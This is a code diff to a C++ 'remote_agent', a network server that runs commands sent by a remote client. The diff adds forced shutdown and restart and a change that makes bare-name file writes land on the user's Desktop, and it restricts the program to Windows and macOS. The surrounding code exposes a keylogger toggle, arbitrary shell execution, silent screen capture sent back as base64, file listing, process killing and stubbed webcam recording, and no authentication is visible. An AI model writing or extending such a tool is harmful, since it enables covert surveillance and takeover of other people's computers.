@@ -1,6 +1,7 @@
 #include <algorithm>
 #include <array>
 #include <chrono>
+#include <cstdlib>
 #include <cstring>
 #include <ctime>
 #include <fstream>
@@ -11,20 +12,23 @@
 #include <thread>
 #include <vector>
 
+#if !defined(_WIN32) && !defined(__APPLE__)
+#error "remote_agent supports Windows and macOS only."
+#endif
+
 #ifdef _WIN32
 #define NOMINMAX
 #include <winsock2.h>
 #include <ws2tcpip.h>
 using SocketType = SOCKET;
 constexpr SocketType INVALID_SOCKET_FD = INVALID_SOCKET;
-#else
+#elif defined(__APPLE__)
 #include <arpa/inet.h>
 #include <netinet/in.h>
 #include <sys/socket.h>
 #include <unistd.h>
 using SocketType = int;
 constexpr SocketType INVALID_SOCKET_FD = -1;
-
 #endif
 
 #ifdef __APPLE__
@@ -131,7 +135,7 @@ namespace {
            std::string(g_keyloggerRunning ? "true" : "false") + ",\"output\":\"" +
            escapeJson(ss.str()) + "\"}";
   }
-#else
+#elif defined(_WIN32)
   std::string keyloggerStartJson() {
     return "{\"ok\":false,\"command\":\"KEYLOGGER_START\",\"message\":\"unsupported_os\"}";
   }
@@ -193,7 +197,7 @@ namespace {
   std::string runShellCommand(const std::string& command) {
   #ifdef _WIN32
     FILE* pipe = _popen(command.c_str(), "r");
-  #else
+  #elif defined(__APPLE__)
     FILE* pipe = popen(command.c_str(), "r");
   #endif
     if (!pipe) {
@@ -208,7 +212,7 @@ namespace {
 
   #ifdef _WIN32
     _pclose(pipe);
-  #else
+  #elif defined(__APPLE__)
     pclose(pipe);
   #endif
     return trim(output);
@@ -290,12 +294,53 @@ namespace {
            "\",\"data\":\"" + b64 + "\"}";
   }
 
+  bool isBareFileNameForWrite(const std::string& path) {
+    if (path.empty()) return false;
+    if (path == "." || path == "..") return false;
+#ifdef _WIN32
+    if (path.find_first_of("/\\:") != std::string::npos) return false;
+#elif defined(__APPLE__)
+    if (path.find('/') != std::string::npos) return false;
+#endif
+    return true;
+  }
+
+  std::string desktopDirectoryPath() {
+#ifdef _WIN32
+    const char* profile = std::getenv("USERPROFILE");
+    if (!profile || !*profile) return "";
+    std::string d(profile);
+    while (!d.empty() && (d.back() == '\\' || d.back() == '/')) d.pop_back();
+    d += "\\Desktop";
+    return d;
+#elif defined(__APPLE__)
+    const char* home = std::getenv("HOME");
+    if (!home || !*home) return "";
+    std::string d(home);
+    while (!d.empty() && d.back() == '/') d.pop_back();
+    d += "/Desktop";
+    return d;
+#endif
+  }
+
+  std::string resolveWritePath(const std::string& path) {
+    if (!isBareFileNameForWrite(path)) return path;
+    const std::string desk = desktopDirectoryPath();
+    if (desk.empty()) return path;
+#ifdef _WIN32
+    return desk + "\\" + path;
+#elif defined(__APPLE__)
+    return desk + "/" + path;
+#endif
+  }
+
   std::string writeFileBase64Json(const std::string& path, const std::string& dataB64) {
     std::vector<unsigned char> bytes;
     if (!base64Decode(dataB64, bytes)) {
       return "{\"ok\":false,\"command\":\"WRITE_FILE_BASE64\",\"message\":\"invalid_base64\"}";
     }
-    std::ofstream file(path, std::ios::binary);
+    const std::string resolved = resolveWritePath(path);
+    std::ofstream file(resolved, std::ios::binary);
     if (!file) {
       return "{\"ok\":false,\"command\":\"WRITE_FILE_BASE64\",\"message\":\"open_failed\"}";
     }
@@ -303,30 +348,54 @@ namespace {
     if (!file) {
       return "{\"ok\":false,\"command\":\"WRITE_FILE_BASE64\",\"message\":\"write_failed\"}";
     }
-    return "{\"ok\":true,\"command\":\"WRITE_FILE_BASE64\",\"path\":\"" + escapeJson(path) +
-           "\",\"bytes\":" + std::to_string(bytes.size()) + "}";
+    const std::string requestedEsc = escapeJson(path);
+    const std::string resolvedEsc = escapeJson(resolved);
+    return "{\"ok\":true,\"command\":\"WRITE_FILE_BASE64\",\"requested\":\"" + requestedEsc +
+           "\",\"path\":\"" + resolvedEsc + "\",\"bytes\":" + std::to_string(bytes.size()) + "}";
   }
+
+#ifdef __APPLE__
+  /** Expand ~ and ~/... to $HOME (tilde is not expanded inside single-quoted shell args). */
+  std::string expandTildeUnixPath(const std::string& path) {
+    if (path.empty() || path[0] != '~') return path;
+    const char* h = std::getenv("HOME");
+    if (!h || !*h) return path;
+    if (path == "~" || path == "~/") return std::string(h);
+    if (path.size() >= 2 && path[1] == '/') return std::string(h) + path.substr(1);
+    return path;
+  }
+#endif
 
   std::string listFilesJson(const std::string& dirPath) {
 #ifdef _WIN32
     const std::string cmd =
         "powershell -NoProfile -Command \"Get-ChildItem -LiteralPath '" +
         escapeSingleQuotesPowerShell(dirPath) +
-        "' -File -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName\"";
-#else
-    const std::string cmd = "sh -c \"ls -1p " + shellSingleQuote(dirPath) + " 2>/dev/null | sed '/\\/$/d'\"";
+        "' -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName\"";
+#elif defined(__APPLE__)
+    // ls -1 : one name per line; -p : append '/' to directories (so you see both files and subfolders).
+    const std::string expanded = expandTildeUnixPath(trim(dirPath));
+    const std::string cmd =
+        "sh -c \"ls -1p " + shellSingleQuote(expanded) + " 2>/dev/null | tr -d '\\r'\"";
 #endif
     const std::string out = runShellCommand(cmd);
     std::vector<std::string> lines = splitLines(out);
     std::string items = "[";
+    bool firstItem = true;
     for (size_t i = 0; i < lines.size(); ++i) {
-      if (i > 0) items += ",";
 #ifdef _WIN32
+      if (!firstItem) items += ",";
+      firstItem = false;
       items += "\"" + escapeJson(lines[i]) + "\"";
-#else
-      std::string full = dirPath;
-      if (!full.empty() && full.back() != '/') full += "/";
-      full += lines[i];
+#elif defined(__APPLE__)
+      std::string name = lines[i];
+      while (!name.empty() && (name.back() == '/' || name.back() == '\\')) name.pop_back();
+      if (name.empty()) continue;
+      if (!firstItem) items += ",";
+      firstItem = false;
+      std::string full = expanded;
+      if (!full.empty() && full.back() != '/' && full.back() != '\\') full += "/";
+      full += name;
       items += "\"" + escapeJson(full) + "\"";
 #endif
     }
@@ -337,7 +406,7 @@ namespace {
   std::string listProcesses() {
   #ifdef _WIN32
     return runShellCommand("tasklist /FO TABLE");
-  #else
+  #elif defined(__APPLE__)
     return runShellCommand("ps -axo pid,comm");
   #endif
   }
@@ -400,9 +469,6 @@ namespace {
           "powershell -NoProfile -Command \"Get-Process -Name '" + escapeSingleQuotesPowerShell(n) +
           "' -ErrorAction SilentlyContinue | Stop-Process -Force\" 2>&1");
     }
-#else
-    out = runShellCommand("killall -q \"" + escapeForDoubleQuotedShell(stripAppBundleSuffix(appName)) +
-                          "\" 2>&1");
 #endif
     return "{\"ok\":true,\"command\":\"STOP_APP_BY_NAME\",\"output\":\"" + escapeJson(out) + "\"}";
   }
@@ -414,9 +480,6 @@ namespace {
         "-ErrorAction SilentlyContinue | Select-Object -First 45 -ExpandProperty Name\"");
    #elif defined(__APPLE__)
     return runShellCommand("ls /Applications 2>/dev/null");
-   #else
-    return runShellCommand(
-        "ls /usr/share/applications/*.desktop 2>/dev/null | xargs -n1 basename -s .desktop");
    #endif
   }
 
@@ -461,10 +524,6 @@ namespace {
     const std::string lowerSnap = toLowerAscii(snap);
     const std::string lowerName = toLowerAscii(appLine);
     return lowerSnap.find(lowerName) != std::string::npos;
-#else
-    const std::string cmd = "pgrep -f " + shellSingleQuote(appLine) + " 2>/dev/null | head -1";
-    const std::string out = runShellCommand(cmd);
-    return !out.empty() && out != "shell_error";
 #endif
   }
 
@@ -487,14 +546,6 @@ namespace {
     const std::string cmd =
         "sh -c 'tmp=\"/tmp/rca_shot_$$.png\"; "
         "screencapture -x -t png \"$tmp\" >/dev/null 2>&1 && "
-        "base64 < \"$tmp\" | tr -d \"\\n\"; "
-        "rc=$?; rm -f \"$tmp\"; exit $rc' 2>/dev/null";
-#else
-    const std::string cmd =
-        "sh -c 'tmp=\"/tmp/rca_shot_$$.png\"; "
-        "(import -window root \"$tmp\" >/dev/null 2>&1 || "
-        "gnome-screenshot -f \"$tmp\" >/dev/null 2>&1 || "
-        "grim \"$tmp\" >/dev/null 2>&1) && "
         "base64 < \"$tmp\" | tr -d \"\\n\"; "
         "rc=$?; rm -f \"$tmp\"; exit $rc' 2>/dev/null";
 #endif
@@ -534,7 +585,7 @@ namespace {
   std::string killProcessByPid(const std::string& pid, const std::string& commandLabel) {
    #ifdef _WIN32
     const std::string out = runShellCommand("taskkill /PID " + pid + " /F 2>&1");
-   #else
+   #elif defined(__APPLE__)
     const std::string out = runShellCommand("kill -9 " + pid + " 2>&1");
    #endif
     return "{\"ok\":true,\"command\":\"" + escapeJson(commandLabel) +
@@ -544,6 +595,34 @@ namespace {
   std::string commandNotImplemented(const std::string& cmd) {
     return "{\"ok\":false,\"command\":\"" + escapeJson(cmd) +
           "\",\"message\":\"not_implemented_yet\"}";
+  }
+
+  /** SHUTDOWN / RESTART — Windows: shutdown.exe; macOS: AppleScript System Events. */
+  std::string shutdownOrRestartJson(const std::string& commandLabel) {
+    std::string out;
+#ifdef _WIN32
+    if (commandLabel == "SHUTDOWN") {
+      out = runShellCommand("shutdown /s /f /t 0 2>&1");
+    } else {
+      out = runShellCommand("shutdown /r /f /t 0 2>&1");
+    }
+#elif defined(__APPLE__)
+    // No sudo/TTY here — use GUI session API. Grant Automation for System Events to Terminal / IDE / agent.
+    if (commandLabel == "SHUTDOWN") {
+      out = runShellCommand(
+          "osascript -e 'tell application \"System Events\" to shut down' 2>&1");
+    } else {
+      out = runShellCommand(
+          "osascript -e 'tell application \"System Events\" to restart' 2>&1");
+    }
+#endif
+    const bool shellFailed = (out == "shell_error");
+    if (shellFailed) {
+      return "{\"ok\":false,\"command\":\"" + escapeJson(commandLabel) +
+             "\",\"message\":\"shell_failed\",\"output\":\"\"}";
+    }
+    return "{\"ok\":true,\"command\":\"" + escapeJson(commandLabel) +
+           "\",\"output\":\"" + escapeJson(out) + "\"}";
   }
 
   std::string processCommand(const std::string& rawLine) {
@@ -579,8 +658,6 @@ namespace {
           "'\" 2>&1");
 #elif defined(__APPLE__)
       out = runShellCommand("open -a \"" + escapeForDoubleQuotedShell(appName) + "\" 2>&1");
-#else
-      out = runShellCommand("gtk-launch \"" + escapeForDoubleQuotedShell(appName) + "\" 2>&1");
 #endif
       return "{\"ok\":true,\"command\":\"START_APP_BY_NAME\",\"output\":\"" + escapeJson(out) + "\"}";
     }
@@ -611,8 +688,13 @@ namespace {
     if (cmd == "SCREENSHOT") {
       return screenshotJsonResponse();
     }
-    if (cmd == "START_APP" || cmd == "STOP_APP" ||
-        cmd == "COPY_FILE" || cmd == "SHUTDOWN" || cmd == "RESTART" ||
+    if (cmd == "SHUTDOWN") {
+      return shutdownOrRestartJson("SHUTDOWN");
+    }
+    if (cmd == "RESTART") {
+      return shutdownOrRestartJson("RESTART");
+    }
+    if (cmd == "START_APP" || cmd == "STOP_APP" || cmd == "COPY_FILE" ||
         cmd == "WEBCAM_START" || cmd == "WEBCAM_RECORD_START" || cmd == "WEBCAM_RECORD_STOP") {
       return commandNotImplemented(cmd);
     }
@@ -624,7 +706,7 @@ namespace {
   void closeSocket(SocketType fd) {
   #ifdef _WIN32
     closesocket(fd);
-  #else
+  #elif defined(__APPLE__)
     close(fd);
   #endif
   }
@@ -636,7 +718,7 @@ namespace {
     while (true) {
   #ifdef _WIN32
       const int bytesRead = recv(clientFd, buffer.data(), static_cast<int>(buffer.size()), 0);
-  #else
+  #elif defined(__APPLE__)
       const int bytesRead = static_cast<int>(recv(clientFd, buffer.data(), buffer.size(), 0));
   #endif
       if (bytesRead <= 0) break;
@@ -647,7 +729,7 @@ namespace {
         const std::string response = processCommand(line) + "\n";
   #ifdef _WIN32
         send(clientFd, response.c_str(), static_cast<int>(response.size()), 0);
-  #else
+  #elif defined(__APPLE__)
         send(clientFd, response.c_str(), response.size(), 0);
   #endif
         break;
@@ -661,7 +743,7 @@ namespace {
   #ifdef _WIN32
     WSADATA wsData{};
     return WSAStartup(MAKEWORD(2, 2), &wsData) == 0;
-  #else
+  #elif defined(__APPLE__)
     return true;
   #endif
   }
@@ -699,7 +781,7 @@ int main(int argc, char* argv[]) {
   int opt = 1;
 #ifdef _WIN32
   setsockopt(serverFd, SOL_SOCKET, SO_REUSEADDR, reinterpret_cast<const char*>(&opt), sizeof(opt));
-#else
+#elif defined(__APPLE__)
   setsockopt(serverFd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
 #endif
 
@@ -729,7 +811,7 @@ int main(int argc, char* argv[]) {
 #ifdef _WIN32
     int clientLen = sizeof(clientAddr);
     SocketType clientFd = accept(serverFd, reinterpret_cast<sockaddr*>(&clientAddr), &clientLen);
-#else
+#elif defined(__APPLE__)
     socklen_t clientLen = sizeof(clientAddr);
     SocketType clientFd = accept(serverFd, reinterpret_cast<sockaddr*>(&clientAddr), &clientLen);
 #endif
